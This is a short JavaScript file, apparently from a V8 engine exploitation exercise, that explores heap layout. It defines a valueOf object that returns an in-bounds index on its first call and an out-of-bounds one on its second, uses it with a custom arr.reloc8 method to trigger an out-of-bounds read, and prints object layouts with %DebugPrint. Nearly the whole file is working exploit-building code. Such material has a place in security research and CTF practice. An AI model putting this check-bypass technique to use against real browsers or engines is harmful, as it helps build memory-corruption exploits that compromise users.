// t1.js - heap layout exploration
let arr = new Array(100).fill(1.1);
let ta = new BigUint64Array(0x1337);
let probe = new Uint8Array(16);
let oarr = [{}];
let rw = [1.1];

function mkArg(idx) {
  let n = 0;
  return { valueOf() { n++; return n === 2 ? idx : 0; } };
}

// sanity: first-call value must be in-bounds (0), second-call does OOB read at 150
arr.reloc8(mkArg(150), 0);

%DebugPrint(arr);
%DebugPrint(ta);
%DebugPrint(probe);
%DebugPrint(oarr);
%DebugPrint(rw);
throw "after OOB read idx150: arr[0]=" + arr[0];
